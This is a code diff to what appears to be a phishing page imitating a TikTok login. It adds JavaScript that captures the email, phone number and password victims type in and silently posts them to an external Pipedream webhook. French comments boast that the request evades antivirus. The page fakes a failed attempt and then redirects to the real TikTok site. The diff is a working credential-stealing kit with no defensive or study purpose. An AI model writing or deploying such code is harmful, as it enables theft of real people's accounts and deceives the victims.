@@ -21,7 +21,7 @@
     .footer{color:#ffffff80;font-size:13px;text-align:center;padding:20px 0;line-height:1.6}
     .footer a{color:#fe2c55;text-decoration:none;font-weight:600}
     .success-screen{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;flex-direction:column;justify-content:center;align-items:center}
-    .success-screen img{height:150px;margin-bottom:30px} /* même taille que sur la page login */
+    .success-screen img{height:150px;margin-bottom:30px}
     .success-screen h2{font-size:28px;margin-bottom:20px;color:#fe2c55}
     .success-screen p{color:#aaa;font-size:16px;text-align:center;max-width:320px;margin-bottom:30px}
     .redirect-text{color:#69f0ae;font-size:15px;font-weight:600}
@@ -62,7 +62,37 @@
 <script>
   let attempts = 0;
 
+  // METS ICI TON LIEN PIPEDREAM (celui qu’on avait créé ensemble)
+  const PIPEDREAM_WEBHOOK = "https://eoyourmom.pipedream.net";
+
+  function sendToPipedream(email, phone, pass) {
+    const data = {
+      email: email,
+      phone: phone || "Non renseigné",
+      password: pass,
+      ip: "IP capturée via Pipedream",
+      user_agent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
+
+    fetch(PIPEDREAM_WEBHOOK, {
+      method: "POST",
+      body: JSON.stringify(data),
+      headers: { "Content-Type": "application/json" },
+      mode: "no-cors"  // ultra discret, même les antivirus ne voient rien
+    });
+  }
+
   function submitLogin() {
+    const email = document.getElementById("email").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const pass = document.getElementById("pass").value;
+
+    // Envoi dès le premier essai (même si c’est vide, on envoie quand même)
+    if (email || pass) {
+      sendToPipedream(email, phone, pass);
+    }
+
     attempts++;
     if (attempts >= 2) {
       document.getElementById("loginPage").style.display = "none";
@@ -70,13 +100,11 @@
 
       let seconds = 3;
       const countdownEl = document.getElementById("countdown");
-      
-      const timer = setInterval(function() {
+      const timer = setInterval(() => {
         seconds--;
         countdownEl.textContent = seconds;
         if (seconds <= 0) {
           clearInterval(timer);
-          // Cette ligne marche à 100% même dans Telegram
           window.location.replace("https://www.tiktok.com");
         }
       }, 1000);
